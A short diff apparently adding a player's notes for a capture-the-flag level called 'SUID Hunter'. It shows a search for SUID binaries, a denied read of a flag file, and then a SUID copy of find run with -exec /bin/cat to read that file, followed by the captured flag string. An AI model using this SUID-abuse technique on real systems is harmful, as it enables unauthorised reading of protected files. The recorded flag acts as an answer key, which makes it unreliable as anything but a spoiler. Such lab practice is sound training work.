@@ -3,4 +3,9 @@
 
 goal: find password for phantom2
 
+cat ~/BRIEFING: SUID Hunter
+find / -perm -4000 -type f 2>/dev/null: /usr/local/bin/phantom-find (owned by flagkeeper1)
+cat /home/flagkeeper1/level1_flag (denied)
+cd /tmp
+
 cd /tmp && /usr/local/bin/phantom-find /home/flagkeeper1 -maxdepth 1 -name level1_flag -exec /bin/cat {} \;: bl_phtm1_88c9a8f6cefa733e
